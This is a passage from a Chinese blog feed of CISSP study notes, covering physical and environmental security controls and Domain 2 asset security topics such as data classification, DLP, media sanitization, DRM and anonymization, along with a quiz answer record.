MTBF</h2><p><strong>平均故障时间（MTTF）</strong></p><p>特定操作环境下设备典型的预期寿命。</p><p><strong>平均恢复时间（MTTR）</strong></p><p>对设备进行修复所需的平均时长。</p><p><strong>评估故障间隔时间（MTBF）</strong></p><p>对第一次和后续故障之间的间隔时间的估计。</p><h2 id="了解如何设计与设置安全工作区"><a href="#了解如何设计与设置安全工作区" class="headerlink" title="了解如何设计与设置安全工作区"></a>了解如何设计与设置安全工作区</h2><p>设施中所有区域的访问等级不应是整齐划一的。</p><p>区域中所放资产的价值或重要度越高，对该区域的访问就应该受到越严格的限制。</p><p>高价值及保密的资产应该位于设施保护的核心或中心。</p><h2 id="理解配线间的安全要点"><a href="#理解配线间的安全要点" class="headerlink" title="理解配线间的安全要点"></a>理解配线间的安全要点</h2><p>配线间是放置整栋楼或单层网络电缆的地方，这些电缆连接着其他重要的设备，如配线架、交换机、路由器、LAN扩展器以及主干通道。</p><p>配线间安全的重点是防止非法的物理访问。</p><p>如果非法入侵者进入该区域，他们可能会偷盗设备，拉断电缆，甚至安装监听设备。</p><h2 id="理解智能卡"><a href="#理解智能卡" class="headerlink" title="理解智能卡"></a>理解智能卡</h2><p>智能卡是信用卡大小的身份标识、胸卡或带有嵌入式磁条、条形码或集成电路芯片的安全通行证。</p><p>其中包含可用于识别和&#x2F;或认证目的的授权持有人的信息。</p><h2 id="理解入侵检测系统"><a href="#理解入侵检测系统" class="headerlink" title="理解入侵检测系统"></a>理解入侵检测系统</h2><p>入侵检测系统（IDS）或防盗报警器是自动或手动的系统，用于检测：</p><ul><li>入侵、破坏和攻击企图；</li><li>是否使用了未经授权的入口；</li><li>是否在未授权或异常的时间内发生了特殊事件。</li></ul><h2 id="了解摄像头"><a href="#了解摄像头" class="headerlink" title="了解摄像头"></a>了解摄像头</h2><p>视频监控&#x2F;监视、闭路电视（CCTV）和安全摄像头都是威慑不必要的活动并创建事件数字记录的手段。</p><p><strong>摄像机</strong></p><p>可以是公开的，也可以是隐藏的；</p><p>可以在本地或云端存储记录；</p><p>可以提供摇摄、倾斜和变焦功能；</p><p>可以在可见光或红外光下工作；</p><p>可能由运动触发；</p><p>可以支持延时记录、跟踪、面部识别、目标检测、红外或色彩过滤；</p><p>可以提供人脸识别、步态分析和目标检测。</p><h2 id="理解介质存储的安全要求"><a href="#理解介质存储的安全要求" class="headerlink" title="理解介质存储的安全要求"></a>理解介质存储的安全要求</h2><p>介质存储设施用于安全存储空白介质、可重用介质以及安装介质。</p><p>应重点关注偷盗、腐蚀以及残余数据恢复问题。</p><p>介质存储设施保护措施包括：</p><p>使用带锁的柜子或保险箱</p><p>指定保管员&#x2F;托管员</p><p>设置检入&#x2F;检出流程</p><p>进行介质净化</p><h2 id="理解证据存储的重点"><a href="#理解证据存储的重点" class="headerlink" title="理解证据存储的重点"></a>理解证据存储的重点</h2><p>证据存储常用于保存日志、磁盘镜像、虚拟机快照以及其他用于恢复的数据、内部调查资料及取证调查资料。</p><p>保护手段包括：</p><p>专用&#x2F;单独的存储设施</p><p>离线存储</p><p>活动追踪</p><p>哈希管理</p><p>访问限制</p><p>加密</p><h2 id="了解物理访问控制面临的常见威胁"><a href="#了解物理访问控制面临的常见威胁" class="headerlink" title="了解物理访问控制面临的常见威胁"></a>了解物理访问控制面临的常见威胁</h2><p>无论采用哪种形式的物理访问控制，都必须配备安全警卫或其他监视系统，以防止滥用、假冒、伪装、尾随及捎带。</p><h2 id="了解与电力问题相关的常用术语"><a href="#了解与电力问题相关的常用术语" class="headerlink" title="了解与电力问题相关的常用术语"></a>了解与电力问题相关的常用术语</h2><p>知道下列术语的定义：</p><p>故障</p><p>停电</p><p>电压骤降</p><p>低电压</p><p>尖峰</p><p>浪涌</p><p>合闸电流</p><p>接地</p><p>噪声</p><h2 id="理解如何控制环境"><a href="#理解如何控制环境" class="headerlink" title="理解如何控制环境"></a>理解如何控制环境</h2><p>除了电力供应，环境的控制还包括对 HVAC 的控制。</p><p>放置计算机的房间温度保持在 59-89.6 华氏度（15-32摄氏度）之间。</p><p>计算机机房的湿度应该保持在 20% - 80% 。</p><p>湿度太高时可能腐蚀机器，湿度太低时可能产生静电。</p><h2 id="了解静电的有关知识"><a href="#了解静电的有关知识" class="headerlink" title="了解静电的有关知识"></a>了解静电的有关知识</h2><p>即使在抗静电地毯上，如果环境湿度过低，依然可能产生 20 000 伏的静电放电。</p><p>即使是最低级别的静电放电电压，也足以摧毁电子设备。</p><h2 id="理解对漏水和洪水管理的要求"><a href="#理解对漏水和洪水管理的要求" class="headerlink" title="理解对漏水和洪水管理的要求"></a>理解对漏水和洪水管理的要求</h2><p>环境安全策略及程序中应该包括针对漏水与洪水问题的解决方法。</p><p>虽然管道漏水的情况不会天天发生，可是一旦发生就会带来灾难性的后果。</p><p>水与火不相容，如果计算机系统进了水，特别是当其处于运行状态时，注定会损坏系统。</p><p>任何可能的情况下，本地服务器机房及关键计算机设备都应该远离水源或输水管道。</p><h2 id="理解火灾探测及消防系统的重要性"><a href="#理解火灾探测及消防系统的重要性" class="headerlink" title="理解火灾探测及消防系统的重要性"></a>理解火灾探测及消防系统的重要性</h2><p>不能忽视火灾的探测及消防。</p><p>任何安保系统的首要目标都是保护人员的安全。</p><p>除了保护人，火灾探测与消防系统的设计还应该努力将由火、烟、高温以及灭火材料造成的损坏降到最低，而且要重要保护 IT 基础设施。</p><h2 id="理解火灾探测及消防系统可能带来的污染与损害"><a href="#理解火灾探测及消防系统可能带来的污染与损害" class="headerlink" title="理解火灾探测及消防系统可能带来的污染与损害"></a>理解火灾探测及消防系统可能带来的污染与损害</h2><p>火灾的破坏因素不但包括火和烟，还有灭火剂，例如水与碳酸钠。</p><p>烟会损坏大多数存储设备。</p><p>高温会损坏任何电子及计算机部件。</p><p>灭火剂可能导致短路、初级腐蚀。或使设备失效。</p><p>在设计消防系统时，必须将这些因素考虑进去。</p><h2 id="了解物理边界安全控制"><a href="#了解物理边界安全控制" class="headerlink" title="了解物理边界安全控制"></a>了解物理边界安全控制</h2><p>可以使用围栏、门、旋转门、访问控制门厅、隔离桩和路障来实现对设施的访问控制。</p><h2 id="理解照明"><a href="#理解照明" class="headerlink" title="理解照明"></a>理解照明</h2><p>照明是最常见的边界安全控制形式，提供威慑的安全效果。</p><h2 id="了解警卫和警犬"><a href="#了解警卫和警犬" class="headerlink" title="了解警卫和警犬"></a>了解警卫和警犬</h2><p>可以在边界或内部设置警卫，以监控出入口或监视探测与攻击画面。</p><p>警卫的优点：能够适应各种状态或情况并做出反应。</p><p>警卫可以学习和识别攻击和入侵活动模式，可以适应不断变化的环境，并可以做出决策和判断。</p><p>警犬可以充当警卫的替代品，通常用于边界安全控制。</p><p>警犬是一种非常有效的检测和威慑手段。</p><h2 id="理解如何在安全设施中应对访客"><a href="#理解如何在安全设施中应对访客" class="headerlink" title="理解如何在安全设施中应对访客"></a>理解如何在安全设施中应对访客</h2><p>若设施中划分了限制区来控制物理安全，就有必要建立访客处理机制。</p><p>通常的做法是为访客指派一个陪护人员，密切监视访客的出入于活动。</p><p>如果允许外来者进入保护区，却没有对其活动进行有效的追踪、控制，肯能会损害受保护资产的安全。</p><h2 id="理解内部安全控制"><a href="#理解内部安全控制" class="headerlink" title="理解内部安全控制"></a>理解内部安全控制</h2><p>内部控制有多种物理安全机制，包括锁、胸卡、分布电缆保护系统（PDS）、动作探测器、入侵警报和二次验证机制等。</p><h2 id="理解人员隐私和安全"><a href="#理解人员隐私和安全" class="headerlink" title="理解人员隐私和安全"></a>理解人员隐私和安全</h2><p>在任何情况和条件下，安全方案最重要的方面都是保护人。</p><p>因此，防止人身伤害是所有安全工作的首要目标。</p><h2 id="了解物理安全的-KPI"><a href="#了解物理安全的-KPI" class="headerlink" title="了解物理安全的 KPI"></a>了解物理安全的 KPI</h2><p>应该确定、监控、记录和评估物理安全的关键绩效指标（KPI）。</p><p>KPI 是物理安全各个方面的操作或故障的指标。</p><h1 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h1><p>C B ACDF  D A </p><p>✅ ✅ ❌ACF ✅ ✅</p><p>C B BCEFGH C B</p><p>✅ ✅ ❌BCEFH ✅ ✅</p><p>D BCD B C C </p><p>✅ ✅ ✅ ✅ ✅</p><p>C B A C A</p><p>✅ ❌D ✅ ✅ ❌D</p><p>不同探测器原理</p><p>最常用物理安全机制照明</p><p>电缆设备管理策略要素</p><p>摄像机</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>5-域2资产安全-保护资产安全</title>
    <link href="/2025/04/29/security/seccert/cissp/5-%E5%9F%9F2%E8%B5%84%E4%BA%A7%E5%AE%89%E5%85%A8-%E4%BF%9D%E6%8A%A4%E8%B5%84%E4%BA%A7%E5%AE%89%E5%85%A8/"/>
    <url>/2025/04/29/security/seccert/cissp/5-%E5%9F%9F2%E8%B5%84%E4%BA%A7%E5%AE%89%E5%85%A8-%E4%BF%9D%E6%8A%A4%E8%B5%84%E4%BA%A7%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>敏感信息常指任何非公开的信息。</p><h1 id="5-1-对信息和资产进行识别"><a href="#5-1-对信息和资产进行识别" class="headerlink" title="5.1 对信息和资产进行识别"></a>5.1 对信息和资产进行识别</h1><p>数据安全生命周期管理是指数据保护始于数据被首次创建时，一直持续到该数据被销毁时。</p><h2 id="5-1-1-定义敏感数据"><a href="#5-1-1-定义敏感数据" class="headerlink" title="5.1.1 定义敏感数据"></a>5.1.1 定义敏感数据</h2><p>敏感数据不是公开数据、也不是未分类数据。</p><p>包括机密的、专有的、受保护的或对组织价值或法律法规需要保护的任何类型的数据。</p><h3 id="1-个人身份信息-PII"><a href="#1-个人身份信息-PII" class="headerlink" title="1. 个人身份信息 PII"></a>1. 个人身份信息 PII</h3><p>个人身份信息（personally identifiable information，PII）是任何可以识别个人的信息。</p><p>NIST 对 PII 的定义，由机构保存的关于个人的任何信息：</p><ul><li>任何可用于识别或追踪个人身份的信息</li><li>与个人有关联或有指向性的其他信息，例如：医疗、教育、财务和就业信息</li></ul><p>组织有责任保护 PII </p><p>数据泄露导致 PII 丢失时，组织需要通知个人</p><h3 id="2-受保护的健康信息-PHI"><a href="#2-受保护的健康信息-PHI" class="headerlink" title="2. 受保护的健康信息 PHI"></a>2. 受保护的健康信息 PHI</h3><p>受保护的健康信息（protected health information，PHI）是与特定个人有关的任何健康信息。</p><p>《健康保险流通与责任法案》HIPAA 要求保护 PII。</p><p>HIPAA 对 PHI 定义，以口头、媒介或任何形式记录的任何信息。</p><p>（1）健康信息由卫生保健提供者、健康计划部门、卫生行政部门等结构设立或接收。</p><p>（2）涉及任何个人过去、现在或将来在身体、精神方面的健康状况、健康保健条款、费用。</p><h3 id="3-专有数据"><a href="#3-专有数据" class="headerlink" title="3. 专有数据"></a>3. 专有数据</h3><p>任何有助于组织保持竞争优势的数据。</p><p>包括：软件代码、产品技术计划、内部流程、知识产权或商业秘密。</p><h2 id="5-1-2-定义数据分类"><a href="#5-1-2-定义数据分类" class="headerlink" title="5.1.2 定义数据分类"></a>5.1.2 定义数据分类</h2><p>数据分类需要纳入安全策略或数据策略。</p><p>数据分类识别数据对组织的价值，保护数据的保密性和完整性。</p><p>数据分类策略</p><ul><li>识别分类标签</li><li>定义如何确定分类</li><li>定义如何根据分类保护数据</li></ul><h3 id="政府组织"><a href="#政府组织" class="headerlink" title="政府组织"></a>政府组织</h3><h4 id="政府数据分类"><a href="#政府数据分类" class="headerlink" title="政府数据分类"></a>政府数据分类</h4><p>任何超过未分类级别的数据都是敏感数据</p><h5 id="绝密-top-secret"><a href="#绝密-top-secret" class="headerlink" title="绝密 top secret"></a>绝密 top secret</h5><p>异常严重的损害</p><h5 id="秘密-secret"><a href="#秘密-secret" class="headerlink" title="秘密 secret"></a>秘密 secret</h5><p>严重损害</p><h5 id="机密-confidential"><a href="#机密-confidential" class="headerlink" title="机密 confidential"></a>机密 confidential</h5><p>损害</p><h5 id="未分类-unclassified"><a href="#未分类-unclassified" class="headerlink" title="未分类 unclassified"></a>未分类 unclassified</h5><p>任何不符合绝密、秘密、机密数据描述的数据</p><h4 id="其他分类"><a href="#其他分类" class="headerlink" title="其他分类"></a>其他分类</h4><p>严格控制具有标签的文件，限制分发</p><h5 id="仅供官方使用"><a href="#仅供官方使用" class="headerlink" title="仅供官方使用"></a>仅供官方使用</h5><p>仅供官方使用（for official use only，FOUO）</p><h5 id="敏感未分类"><a href="#敏感未分类" class="headerlink" title="敏感未分类"></a>敏感未分类</h5><p>敏感未分类（sensitive but unclassified，SBU）</p><h4 id="分类机构"><a href="#分类机构" class="headerlink" title="分类机构"></a>分类机构</h4><p>将原始分类应用于敏感数据的实体，严格的规则确定谁可以这样做。</p><h3 id="非政府组织"><a href="#非政府组织" class="headerlink" title="非政府组织"></a>非政府组织</h3><p>非政府组织关注泄密对组织的潜在损害。</p><p>组织需要考虑数据的敏感性和关键性。</p><h4 id="非政府组织数据分类"><a href="#非政府组织数据分类" class="headerlink" title="非政府组织数据分类"></a>非政府组织数据分类</h4><h5 id="class3-机密-专有"><a href="#class3-机密-专有" class="headerlink" title="class3&#x2F;机密&#x2F;专有"></a>class3&#x2F;机密&#x2F;专有</h5><p>机密：confidential</p><p>专有：proprietary</p><p>最高级别的机密数据。</p><p>泄密造成异常严重的损害。</p><p>例如：未发行电影</p><h5 id="class2-私有"><a href="#class2-私有" class="headerlink" title="class2 &#x2F; 私有"></a>class2 &#x2F; 私有</h5><p>私有：private</p><p>应该在组织中保持私有但不符合机密&#x2F;专有数据定义的数据。</p><p>泄露造成严重损害</p><p>例如：PII、PHI、财务数据</p><h5 id="class1-敏感"><a href="#class1-敏感" class="headerlink" title="class1 &#x2F; 敏感"></a>class1 &#x2F; 敏感</h5><p>敏感：sensitive</p><p>泄密造成损害</p><p>例如：内部网络信息</p><h5 id="class0-公开"><a href="#class0-公开" class="headerlink" title="class0 &#x2F;公开"></a>class0 &#x2F;公开</h5><p>公开：public</p><p>发布在网站、手册或其他任何公共资源的信息。</p><p>不保护公开数据保密性，保护公开数据完整性。</p><p>无损害</p><p><img src="/%E6%88%AA%E5%B1%8F2025-05-28%2010.09.54.png" alt="截屏2025-05-28 10.09.54"></p><h2 id="5-1-3-定义资产分类"><a href="#5-1-3-定义资产分类" class="headerlink" title="5.1.3 定义资产分类"></a>5.1.3 定义资产分类</h2><p>资产分类应该与数据分类相匹配。</p><p>处理绝密数据和存储绝密数据的设备或介质均为绝密资产。</p><p>硬件资产使用清晰的标签。</p><h2 id="5-1-4-理解数据状态"><a href="#5-1-4-理解数据状态" class="headerlink" title="5.1.4 理解数据状态"></a>5.1.4 理解数据状态</h2><p>必须保护处于所有状态（包括静态、传输中和使用中）的数据。</p><h3 id="数据状态"><a href="#数据状态" class="headerlink" title="数据状态"></a>数据状态</h3><h4 id="静态数据"><a href="#静态数据" class="headerlink" title="静态数据"></a>静态数据</h4><p>存储中的数据</p><p>存储在系统硬盘、固态驱动器SSD、外部 USB 驱动器、SAN 存储区域网络和备份磁盘等介质中的数据。</p><h4 id="传输中的数据"><a href="#传输中的数据" class="headerlink" title="传输中的数据"></a>传输中的数据</h4><p>动态数据</p><p>通过网络传输的任何数据，有线、无线、internet传输的数据</p><p>对称加密和非对称加密组合保护数据</p><h4 id="使用中的数据"><a href="#使用中的数据" class="headerlink" title="使用中的数据"></a>使用中的数据</h4><p>处理中的数据</p><p>应用程序所使用的内存或临时存储缓冲区中的数据。</p><p>解密后的数据，不在使用时需要刷新内存缓冲区</p><p>应用程序同态加密保护数据。</p><h3 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h3><h4 id="强加密协议"><a href="#强加密协议" class="headerlink" title="强加密协议"></a>强加密协议</h4><h4 id="强身份认证"><a href="#强身份认证" class="headerlink" title="强身份认证"></a>强身份认证</h4><h4 id="强授权控制机制"><a href="#强授权控制机制" class="headerlink" title="强授权控制机制"></a>强授权控制机制</h4><h2 id="5-1-5-确定合规要求"><a href="#5-1-5-确定合规要求" class="headerlink" title="5.1.5 确定合规要求"></a>5.1.5 确定合规要求</h2><p>需要了解使用的法律要求，并满足所有合规要求。</p><p>组织需要确认适用的法律。</p><h2 id="5-1-6-确定数据控制"><a href="#5-1-6-确定数据控制" class="headerlink" title="5.1.6 确定数据控制"></a>5.1.6 确定数据控制</h2><p>定义数据分类</p><p>定义资产分类</p><p>定义安全要求</p><p>满足安全要求</p><p>DLP （数据丢失预防）检测标签并应用所需的保护。</p><p>IAM （身份和访问管理）安全控制有助于确保只有经过授权的人能访问资源。</p><h1 id="5-2-建立信息和资产的处理要求"><a href="#5-2-建立信息和资产的处理要求" class="headerlink" title="5.2 建立信息和资产的处理要求"></a>5.2 建立信息和资产的处理要求</h1><p>管理敏感数据关键目标：组织数据泄露。</p><p>数据泄露：未经授权的实体查阅和访问敏感数据的事件。</p><h2 id="5-2-1-数据维护"><a href="#5-2-1-数据维护" class="headerlink" title="5.2.1 数据维护"></a>5.2.1 数据维护</h2><p>在数据的整个生命周期中不断地组织和维护数据。</p><p>物理隔离</p><p>手动USB复制</p><p>单向网桥</p><p>网络间软硬件组合解决方案</p><p>定期审查数据策略</p><h2 id="5-2-2-数据丢失预防-DLP"><a href="#5-2-2-数据丢失预防-DLP" class="headerlink" title="5.2.2 数据丢失预防 DLP"></a>5.2.2 数据丢失预防 DLP</h2><p>数据丢失预防  DLP  系统试图检测和阻止导致数据泄露的尝试。</p><p>扫描未加密数据以查找关键字和数据模式。</p><p>模式匹配的 DLP 系统寻找特定的模式。</p><h3 id="DLP-类型"><a href="#DLP-类型" class="headerlink" title="DLP 类型"></a>DLP 类型</h3><h4 id="网络DLP"><a href="#网络DLP" class="headerlink" title="网络DLP"></a>网络DLP</h4><p>基于网络的 DLP 扫描所有传出数据以查找特定的数据。</p><p>基于云的 DLP是基于网络 DLP的子类。</p><h4 id="终端DLP"><a href="#终端DLP" class="headerlink" title="终端DLP"></a>终端DLP</h4><p>基于终端的 DLP 可以扫描存储在系统上的文件以及发送到外部设备的文件。</p><p>例如：防止用户将敏感信息复制到 USB 或打印机。</p><p>DLP 系统通常可以进行深度检查，检查压缩包。</p><p>DLP 系统无法解密数据或检查加密数据。</p><p>DLP 解决方案可以进行内容发现，发现内部网络中有价值数据的位置。</p><h2 id="5-2-3-标记敏感数据和资产"><a href="#5-2-3-标记敏感数据和资产" class="headerlink" title="5.2.3 标记敏感数据和资产"></a>5.2.3 标记敏感数据和资产</h2><p>标记&#x2F;打标签 敏感信息确保用户可方便地识别任何数据的分类级别。</p><p>标记&#x2F;标签提供的最重要信息是数据类别。</p><h3 id="标签类型"><a href="#标签类型" class="headerlink" title="标签类型"></a>标签类型</h3><h4 id="物理标签"><a href="#物理标签" class="headerlink" title="物理标签"></a>物理标签</h4><p>表示存储在资产（如介质）中或在系统中处理的数据的安全类别。</p><p>物理标签在整个生命周期内会一直存留在系统或介质上。</p><h4 id="电子标签"><a href="#电子标签" class="headerlink" title="电子标签"></a>电子标签</h4><p>数字标记或标签</p><h5 id="页眉页脚水印标签"><a href="#页眉页脚水印标签" class="headerlink" title="页眉页脚水印标签"></a>页眉页脚水印标签</h5><p>1、标签会出现在打印的资料上。</p><p>2、DLP 系统可以识别包含敏感信息的文档，并应用适当的安全控制。</p><h5 id="特定桌面背景"><a href="#特定桌面背景" class="headerlink" title="特定桌面背景"></a>特定桌面背景</h5><p>未分类介质和设备使用标签</p><p>可以通过特定程序对介质进行降级（清除净化数据），但是不建议对介质进行降级。</p><h2 id="5-2-4-处理敏感信息和资产"><a href="#5-2-4-处理敏感信息和资产" class="headerlink" title="5.2.4 处理敏感信息和资产"></a>5.2.4 处理敏感信息和资产</h2><p>处理（handling）指的是介质在有效期内的安全传输。</p><p>备份磁盘也需要按照包含的数据级别进行保护。</p><p>云存储数据需要受到与在本地存储的数据相同的保护级别。</p><p>简单存储服务（Simple Storage Service ，S3）</p><p>需要制定策略和程序以确保人们了解如何处理敏感数据。</p><p>应该确保系统和介质被适当地标记。</p><h2 id="5-2-5-数据收集限制"><a href="#5-2-5-数据收集限制" class="headerlink" title="5.2.5 数据收集限制"></a>5.2.5 数据收集限制</h2><p>防止数据丢失的最简单办法之一就是 不收集数据。</p><p>如果数据没有明确的使用目的，请不要收集和存储数据。</p><h2 id="5-2-6-数据位置"><a href="#5-2-6-数据位置" class="headerlink" title="5.2.6 数据位置"></a>5.2.6 数据位置</h2><p>数据位置是指数据备份或数据副本的位置。</p><p>最佳做法：本地站点保存一份，外部站点保存一份。</p><p>需要考虑备份存储的物理位置。</p><h2 id="5-2-7-存储敏感数据"><a href="#5-2-7-存储敏感数据" class="headerlink" title="5.2.7 存储敏感数据"></a>5.2.7 存储敏感数据</h2><p>应该以适当的方式存储敏感数据，以防止受到任何类型损失的影响。</p><p>加密</p><p>物理控制：将存储介质放在服务器上锁的机柜中。</p><p>使用环境控制来保护介质。包括温度、湿度控制，如供暖、通风和空调（heating，ventilation，and air conditioning，HVAC）系统。</p><p>任何敏感数据的价值都远大于保存敏感数据的介质的价值。也就是，购买高质量介质的做法应该是具有成本效益的。</p><h2 id="5-2-8-数据销毁"><a href="#5-2-8-数据销毁" class="headerlink" title="5.2.8 数据销毁"></a>5.2.8 数据销毁</h2><p>净化（sanitization）：</p><p>指直接销毁介质或使用可信方法从介质中清除机密数据而不销毁它。</p><h3 id="1-消除数据残留"><a href="#1-消除数据残留" class="headerlink" title="1. 消除数据残留"></a>1. 消除数据残留</h3><p>数据残留（data remanence）</p><p>指本应该擦除却仍然遗留在介质上的数据。</p><p>硬盘驱动器上的数据被称为剩磁或者剩余空间。</p><p>剩余空间：磁盘集群中未使用的空间。</p><p>存在操作系统将内存中的数据填充剩余空间，因此<strong>永远不应该在非机密系统上处理机密数据</strong></p><p>系统工具删除数据时通常会让许多数据残留在介质上。</p><h4 id="消除方法"><a href="#消除方法" class="headerlink" title="消除方法"></a>消除方法</h4><h5 id="消磁器"><a href="#消磁器" class="headerlink" title="消磁器"></a>消磁器</h5><p>仅对磁性介质有效</p><p>SSD 介质无效</p><p>SSD 保护方法：存储的所有数据都加密</p><h3 id="2-常见数据销毁方法"><a href="#2-常见数据销毁方法" class="headerlink" title="2. 常见数据销毁方法"></a>2. 常见数据销毁方法</h3><h4 id="擦除（erasing）"><a href="#擦除（erasing）" class="headerlink" title="擦除（erasing）"></a>擦除（erasing）</h4><p>只对文件、文件选段或者整个介质执行删除操作。</p><p>删除或移除过程只删除数据目录或者目录链接，实际数据保留在驱动器上。</p><h4 id="清理（clearing）"><a href="#清理（clearing）" class="headerlink" title="清理（clearing）"></a>清理（clearing）</h4><p>清理或覆盖操作，以便重新使用，并确保不能使用传统工具恢复数据。</p><p>原理：</p><p>介质上所有可寻址位都被写入未分类的数据</p><p>方法一：</p><p>在整个介质上写入单个字符或指定位模式</p><p>方法二：</p><p>在整个介质上写入单个字符，然后写入该字符的补码，最后写入随机比特。</p><p>需要注意：</p><p>硬盘上的备用扇区、标记为“坏”的扇区和许多现代 SSD 上的区域不一定能被清除。</p><h4 id="清除（purging）"><a href="#清除（purging）" class="headerlink" title="清除（purging）"></a>清除（purging）</h4><p>更强烈的清理形式，为在不安全的环境中重用介质做准备。</p><p>多次重复清理过程，并且可以和另一种组合在一起以完全去除数据。</p><h4 id="消磁（degaussing）"><a href="#消磁（degaussing）" class="headerlink" title="消磁（degaussing）"></a>消磁（degaussing）</h4><p>消磁器产生一个强磁场，在消磁过程中擦除某些介质上的数据。</p><p>常用磁带的处理。</p><p>不推荐用于硬盘的消磁。</p><p>消磁不影响光盘 CD、DVD 或 SSD。</p><h4 id="销毁（destruction）"><a href="#销毁（destruction）" class="headerlink" title="销毁（destruction）"></a>销毁（destruction）</h4><p>销毁是介质生命周期中的最后阶段，是最安全的介质净化方法。</p><p>常见方法：</p><p>焚烧</p><p>粉碎</p><p>分解</p><p>使用腐蚀性或酸性化学品溶解</p><p>解除分类（declassification）指任何在未分类的环境中为重复使用介质或系统而清除数据的过程。</p><p>解除分类用净化的方法处置，但是成本过高，也存在一些风险，所以直接销毁，而不是解除分类。</p><h3 id="3-加密擦除"><a href="#3-加密擦除" class="headerlink" title="3. 加密擦除"></a>3. 加密擦除</h3><p>使用前提：数据在设备上是加密的。</p><p>加密擦除原理：销毁加密密钥或加解密密钥。</p><p>注意：需要使用另外一种方法来覆盖数据。</p><p>云存储，销毁加密密钥可能是组织唯一安全的删除形式。</p><h2 id="5-2-9-确保适当的数据和资产保留期"><a href="#5-2-9-确保适当的数据和资产保留期" class="headerlink" title="5.2.9 确保适当的数据和资产保留期"></a>5.2.9 确保适当的数据和资产保留期</h2><p>保留要求适用于数据或记录、保存敏感数据的介质、处理敏感数据的系统和访问敏感数据的人员。</p><p>记录保留和介质保留是资产保留最重要的因素。</p><h3 id="记录保留"><a href="#记录保留" class="headerlink" title="记录保留"></a>记录保留</h3><p>指在需要时保留和维护重要信息，并在不需要时销毁它。</p><p>组织的安全策略或数据策略通常会标识保留时间期限。</p><p>法律法规也会要求组织保存数据的时间，即使没有外部要求，组织也需要确定保留时间。</p><p>例如：日志记录需要保留一定时间。</p><p>数据被组织保留的时间越长，成本就越高。</p><h3 id="介质保留"><a href="#介质保留" class="headerlink" title="介质保留"></a>介质保留</h3><p>EOL、EOS、EOSL 适用于软件和硬件</p><p>生产期终止（EOL）：停止销售产品的时间</p><p>支持期终止（EOS）：停止服务支持的时间</p><p>服务期终止（EOSL）</p><p>基于 EOL 和 EOS 时间周期进行更新。</p><h1 id="5-3-数据保护方法"><a href="#5-3-数据保护方法" class="headerlink" title="5.3 数据保护方法"></a>5.3 数据保护方法</h1><p>保护数据保密性的主要方法之一是加密。</p><p>DLP 有助于防止数据泄露。</p><h2 id="5-3-1-数字版权管理-DRM"><a href="#5-3-1-数字版权管理-DRM" class="headerlink" title="5.3.1 数字版权管理 DRM"></a>5.3.1 数字版权管理 DRM</h2><p>数字版权管理（digital right management，DRM）</p><p>DRM 方法试图为受版权保护的作品提供版权保护。</p><p>目的为：防止未经授权使用、修改和分发知识产权等受版权保护的作品的行为。</p><h3 id="相关方法"><a href="#相关方法" class="headerlink" title="相关方法"></a>相关方法</h3><h4 id="DRM-许可证"><a href="#DRM-许可证" class="headerlink" title="DRM 许可证"></a>DRM 许可证</h4><p>许可证授予对产品的访问权限并定义使用条款。</p><p>通常是一个小文件，包含使用条款以及解密密钥</p><h4 id="持久在线认证"><a href="#持久在线认证" class="headerlink" title="持久在线认证"></a>持久在线认证</h4><p>永久在线 DRM</p><p>要求系统连接到 互联网后才能使用产品。</p><p>系统会定期和认证服务器连接。</p><h4 id="持续审计跟踪"><a href="#持续审计跟踪" class="headerlink" title="持续审计跟踪"></a>持续审计跟踪</h4><p>持续审计跟踪记录所有对受版权保护的产品的使用。</p><p>与持久在线认证结合在一起，检测滥用行为，例如：不同地理位置使用统一产品的行为。</p><h4 id="自动过期"><a href="#自动过期" class="headerlink" title="自动过期"></a>自动过期</h4><p>订阅产品，有限的时间内使用，超期会阻止访问。</p><p>DRM 方法用于保护受版权保护的数据，但是不用于保护商标、专利或商业秘密。</p><h2 id="5-3-2-云访问安全代理-CASB"><a href="#5-3-2-云访问安全代理-CASB" class="headerlink" title="5.3.2 云访问安全代理 CASB"></a>5.3.2 云访问安全代理 CASB</h2><p>云访问安全代理（CASB）是指逻辑位置上处于用户和基于云的资源之间的软件。</p><p>任何访问云的人都必须通过 CASB 软件，监控所有活动并执行管理员定义的安全策略。</p><p>CASB 包括身份认证和授权控制，记录所有访问、监控活动并发送可疑活动警报。</p><p>CASB 解决方案可有效地检测影子 IT，影子 IT 是指 IT部门没有批准甚至不知情的情况下使用 IT资源。</p><p>检测方法：收集分析来自网络防火墙和 Web 代理的日志。</p><h2 id="5-3-3-假名化"><a href="#5-3-3-假名化" class="headerlink" title="5.3.3 假名化"></a>5.3.3 假名化</h2><p>假名化是一个使用假名来表示其他数据的过程。</p><p>假名就是别名。</p><p>假名可疑防止攻击者直接通过数据识别到实体，比如识别出个人。</p><p>GDPR（欧盟EU，通用数据保护条例）将假名化定义为用人为标识符替换数据的过程。</p><h2 id="5-3-4-令牌化"><a href="#5-3-4-令牌化" class="headerlink" title="5.3.4 令牌化"></a>5.3.4 令牌化</h2><p>令牌化是使用一个令牌（通常是一个随机字符串）来替换其他数据的做法。</p><p>常用于信用卡交易中。</p><p>信用卡令牌化工作方式：</p><p>注册</p><p>使用</p><p>验证</p><p>完成销售</p><h2 id="5-3-5-匿名化"><a href="#5-3-5-匿名化" class="headerlink" title="5.3.5 匿名化"></a>5.3.5 匿名化</h2><p>如果不需要个人数据，使用匿名化（anonymization）。</p><p>匿名化是删除所有数据的过程，是攻击者理论上无法识别出原始主体或个人。</p><p>有效完成匿名化，可以不遵守 GDPR，但是无法将数据真正匿名化。</p><h3 id="匿名化方法"><a href="#匿名化方法" class="headerlink" title="匿名化方法"></a>匿名化方法</h3><h4 id="随机屏蔽"><a href="#随机屏蔽" class="headerlink" title="随机屏蔽"></a>随机屏蔽</h4><p>交换单个数据列中的数据，使每一条记录不再代表真实的数据，但是，数据仍然保持一个可用于其他目的的聚合值。</p><p>匿名化过程是不可逆的。</p><p>假名化和令牌化是可逆的。</p><h1 id="5-4-理解数据角色"><a href="#5-4-理解数据角色" class="headerlink" title="5.4 理解数据角色"></a>5.4 理解数据角色</h1><p>所有者对数据和资产的保护负有主要责任。</p><h2 id="5-4-1-数据所有者"><a href="#5-4-1-数据所有者" 